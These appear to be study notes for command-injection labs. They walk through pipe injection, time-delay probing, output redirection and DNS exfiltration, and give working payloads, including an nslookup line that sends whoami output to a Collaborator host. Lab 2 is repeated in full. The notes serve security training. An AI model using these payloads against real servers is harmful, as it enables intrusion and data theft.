# os command injection

# LAB 1 : **OS command injection, simple case**

### **The Core Concept**

Command Injection happens when a web server takes your input and pastes it directly into a system terminal command (like Bash or PowerShell) without cleaning it first.

Imagine the server runs this command to check stock:
`stock_check_script.sh [ProductID] [StoreID]`

If we act normally, the server runs: `stock_check_script.sh 1 1`
But if we input `1|whoami` as the Store ID, the server runs:
`stock_check_script.sh 1 1|whoami`

In Linux, the pipe `|` (or semicolon `;`) connects two commands. This tells the server: "Run the stock check script, AND THEN run `whoami`."

---

### **Step-by-Step Walkthrough**

You **must** use **Burp Suite** for this.

### **Step 1: Find the Vulnerable Feature**

1. Open the lab.
2. Click on any product details page.
3. Scroll down to the bottom where it says **"Check stock"**.
4. Select a store (e.g., London) and click **"Check stock"**.
5. In **Burp Proxy > HTTP History**, find the `POST /product/stock` request.

### **Step 2: Inject the Command**

1. Right-click the request and select **Send to Repeater**.
2. Look at the body parameters at the bottom:
`productId=1&storeId=1`
3. We will inject the command separator `|` followed by the command we want (`whoami`).
    - Change `storeId=1` to `storeId=1|whoami`
    - *Note:* You can also often use `;` or `&&`  but for this lab we can use only ; and | .

### **Step 3: Launch and Verify**

1. Click **Send**.
2. **Analyze the Response:**
    - The server will likely return the stock count (e.g., "53") followed immediately by the username of the server (e.g., `peter-cwr42g`).
3. The lab is marked as Solved.

# LAB 2 : **Blind OS command injection with time delays**

### **The Core Concept**

In "Blind" injection, the server executes your command but **does not show you the result**.

- If you run `whoami`, the server runs it, but the web page just says "Thank you for your feedback!" You have no idea if it worked.

**How do we prove it works?**
We force the server to **sleep**.
If we tell the server "Wait for 10 seconds before replying," and the web page actually freezes for 10 seconds, we know we have control.

**The Tool:** `ping`

- `ping -c 10 127.0.0.1`
- This tells the server: "Send 10 ping packets to yourself."
- Since each ping takes about 1 second, this command takes **10 seconds** to finish.

---

### **Step-by-Step Walkthrough**

You **must** use **Burp Suite** for this.

### **Step 1: Find the Target**

1. Open the lab.
2. Click the **"Submit feedback"** link (usually in the header or footer).
3. Fill out the form with random data (Name: `a`, Email: `a@a.com`, Subject: `a`, Message: `a`).
4. Click **"Submit feedback"**.

### **Step 2: Capture the Request**

1. In **Burp Proxy > HTTP History**, find the `POST /feedback` request.
2. Right-click it and select **Send to Repeater**.

### **Step 3: Inject the Time Delay**

We will inject into the `email` field. The lab solution uses the `||` (OR) operator, which runs the second command if the first one fails (or we can simply chain them).

1. In Repeater, locate the `email=...` parameter.
2. Replace the email with this payload:
`email=x||ping+-c+10+127.0.0.1||`
    - **Breakdown:**
        - `x`: A dummy value (likely causes the first part of the server's internal command to fail).
        - `||`: The "OR" operator. "If the previous part fails, run this next part."
        - `ping -c 10 127.0.0.1`: The command that takes 10 seconds.
        - `||`: Another "OR" to connect nicely with whatever code comes *after* our injection.
        - `+`: These are URL-encoded spaces.

### **Step 4: Launch and Verify**

1. Click **Send**.
2. **Watch the Timer:**
    - Look at the "Response received" timer in the bottom right of the Repeater window (or simply count in your head).
    - If the request finishes instantly, it failed.
    - If the request hangs for **10,000ms (10 seconds)** and then returns `200 OK`, you have successfully injected the command.

# LAB 2 : **Blind OS command injection with time delays**

### **The Core Concept**

In "Blind" injection, the server executes your command but **does not show you the result**.

- If you run `whoami`, the server runs it, but the web page just says "Thank you for your feedback!" You have no idea if it worked.

**How do we prove it works?**
We force the server to **sleep**.
If we tell the server "Wait for 10 seconds before replying," and the web page actually freezes for 10 seconds, we know we have control.

**The Tool:** `ping`

- `ping -c 10 127.0.0.1`
- This tells the server: "Send 10 ping packets to yourself."
- Since each ping takes about 1 second, this command takes **10 seconds** to finish.

---

### **Step-by-Step Walkthrough**

You **must** use **Burp Suite** for this.

### **Step 1: Find the Target**

1. Open the lab.
2. Click the **"Submit feedback"** link (usually in the header or footer).
3. Fill out the form with random data (Name: `a`, Email: `a@a.com`, Subject: `a`, Message: `a`).
4. Click **"Submit feedback"**.

### **Step 2: Capture the Request**

1. In **Burp Proxy > HTTP History**, find the `POST /feedback` request.
2. Right-click it and select **Send to Repeater**.

### **Step 3: Inject the Time Delay**

We will inject into the `email` field. The lab solution uses the `||` (OR) operator, which runs the second command if the first one fails (or we can simply chain them).

1. In Repeater, locate the `email=...` parameter.
2. Replace the email with this payload:
`email=x||ping+-c+10+127.0.0.1||`
    - **Breakdown:**
        - `x`: A dummy value (likely causes the first part of the server's internal command to fail).
        - `||`: The "OR" operator. "If the previous part fails, run this next part."
        - `ping -c 10 127.0.0.1`: The command that takes 10 seconds.
        - `||`: Another "OR" to connect nicely with whatever code comes *after* our injection.
        - `+`: These are URL-encoded spaces.

### **Step 4: Launch and Verify**

1. Click **Send**.
2. **Watch the Timer:**
    - Look at the "Response received" timer in the bottom right of the Repeater window (or simply count in your head).
    - If the request finishes instantly, it failed.
    - If the request hangs for **10,000ms (10 seconds)** and then returns `200 OK`, you have successfully injected the command.

# lab 3 :**Blind OS command injection with output redirection**

### **The Core Concept**

In the previous lab, we were "blind" (couldn't see output). Now, we are going to cheat by creating our own "window."

1. **The Problem:** The server runs our command (`whoami`) but throws away the answer.
2. **The Solution (Redirection):** In Linux, the `>` symbol takes the output of a command and saves it into a file instead of showing it on the screen.
    - Command: `whoami > /var/www/images/my_secret.txt`
3. **The Retrieval:** Since `/var/www/images/` is the folder where the website stores its public pictures, if we save a text file there, we can simply ask the web server to show it to us like any other image.

---

### **Step-by-Step Walkthrough**

You **must** use **Burp Suite** for this.

### **Step 1: Plant the "File" (The Injection)**

1. Open the lab and go to the **"Submit feedback"** page.
2. Fill out the form with dummy data.
3. Intercept the `POST /feedback` request in Burp and send it to **Repeater**.
4. **Inject the Payload:**
Modify the `email` parameter to:
`email=||whoami>/var/www/images/output.txt||`
    - **Breakdown:**
        - `||`: Break the original command.
        - `whoami`: The command we want to run.
        - `>`: The redirection operator (Save to file).
        - `/var/www/images/output.txt`: The specific location (writable folder) and filename we are creating.
        - `||`: Close the chain.
5. Click **Send**.
    - The response will likely say "OK" or "Thank you." or show nothing . You won't see the username yet, but the file `output.txt` has been created on the server.

### **Step 2: Retrieve the "File" (The Verification)**

Now we just need to download the file we just created.

1. Go back to the lab's **Home** page.
2. Click on any product to verify that images are loading.
3. In Burp Proxy history, find a request like:
`GET /image?filename=25.jpg`
4. Send it to **Repeater**.
5. **Modify the Request:**
Change `filename=25.jpg` to `filename=output.txt`.
6. Click **Send**.

### **Step 3: Verify Success**

1. Look at the Response Body.
2. Instead of image data, you will see a simple text string (e.g., `peter-abc1234`).
3. The lab is marked as Solved.

# LAB 4 : **Blind OS command injection with out-of-band interaction**

### **The Core Concept**

In the previous lab, we redirected output to a file we could read. But what if we **can't** write to any folder? Or what if the server is locked down so tightly we can't see *any* response?

This is where **Out-of-Band (OOB)** techniques come in.
Instead of trying to see the output on the website, we force the server to "phone home" to a server we control.

- **The Command:** `nslookup` (Name Server Lookup). This command asks a DNS server "What is the IP address of https://www.google.com/search?q=google.com?"
- **The Attack:** We tell the victim server: "Go look up the IP address of `my-secret-server.burpcollaborator.net`."
- **The Evidence:** If we see a DNS request hit *our* server, we know the victim executed our code.

---

### **Step-by-Step Walkthrough**

You **must** use **Burp Suite Professional** (or a version with Collaborator access) for this.)

### **Step 1: Set Up Burp Collaborator**

1. In Burp Suite, go to the **Collaborator** tab.
    - *Note: In older versions, this is under the "Burp" menu -> "Burp Collaborator Client".*
2. Click **"Copy to clipboard"**.
    - This copies a unique domain like `r4nd0m.oastify.com` to your clipboard.

### **Step 2: Construct the Payload**

We want to inject a command that forces a network connection.

- **Command:** `nslookup`
- **Target:** Your clipboard domain.
- **Injection Operator:** `||` (OR) or `;` (Semicolon).
- **Full Payload:**`||nslookup+YOUR-COLLABORATOR-DOMAIN||`*(Note: `+` represents a space in URL encoding).*

### **Step 3: Launch the Attack**

1. Open the lab and go to the **"Submit feedback"** page.
2. Fill out the form with dummy data.
3. Intercept the `POST /feedback` request in Burp and send it to **Repeater**.
4. Modify the `email` parameter:
””email=x||+nslookup+your-id.oastify.com||””
5. Click **Send**.

### **Step 4: Verify Success**

1. Go back to the **Collaborator** tab in Burp Suite.
2. Click **"Poll now"** (if it doesn't update automatically).
3. **Look for interactions:**
    - You should see a **DNS** interaction.
    - This proves the lab server executed `nslookup` and tried to contact your domain.
4. The lab should be marked as Solved on the browser page.

# LAB 5 : **Blind OS command injection with out-of-band data exfiltration**

**The Core Concept**
This exploits a clever trick in how DNS works to steal data when you can't see any output on the screen.
1. **The Problem:** We can make the server run `whoami`, but we can't see the result. The server just says "Thanks for feedback."
2. **The Trick:** We can force the server to look up a domain name.
3. **The Exfiltration:** We tell the server: *"Look up the domain name `[RESULT_OF_WHOAMI].my-server.com`."*
    ◦ The server runs `whoami` → gets `peter`.
    ◦ The server constructs the domain `peter.my-server.com`.
    ◦ The server sends a DNS request to *your* server asking "Who is `peter.my-server.com`?"
    ◦ You look at your server logs and see the name `peter`. You have stolen the data!
**Step-by-Step Walkthrough**
You **must** use **Burp Suite Professional** for this (or a tool that supports OAST like interactsh).
**Step 1: Get Your Listening Server**
1. In Burp Suite, go to the **Collaborator** tab.
2. Click **"Copy to clipboard"**.
    ◦ Let's assume your domain is `random-id.oastify.com`.
**Step 2: Construct the "Smuggling" Payload**
We need to use **Backticks** (```). In Linux command line, anything inside backticks is executed *first*, and the result is pasted into the main command.
• **Command:** `nslookup`
• **Target:** ``whoami`.random-id.oastify.com`
• **Injection:** `||`
• **Full Payload:**
`email=||nslookup+`whoami`.YOUR-COLLABORATOR-DOMAIN||`
**Step 3: Launch the Attack**
1. Open the lab and submit dummy feedback.
2. Intercept the `POST /feedback` request and send it to **Repeater**.
3. Replace the `email` parameter with your payload:
`email=||nslookup+`whoami`.YOUR-COLLABORATOR-DOMAIN||`
4. Click **Send**.
**Step 4: Extract the Data**
1. Go back to the **Collaborator** tab.
2. Click **"Poll now"**.
3. Click on the new **DNS** interaction that appears.
4. Look at the **"Description"** or **"Request to Collaborator"** section.
    ◦ You will see a query for something like: `peter-123xyz.random-id.oastify.com`.
    ◦ The part *before* your domain (`peter-123xyz`) is the output of the `whoami` command.
**Step 5: Solve the Lab**
1. Copy the username you found (e.g., `peter-123xyz`).
2. Go back to the lab browser.
3. Click the **"Submit solution"** button.
4. Paste the username and click OK.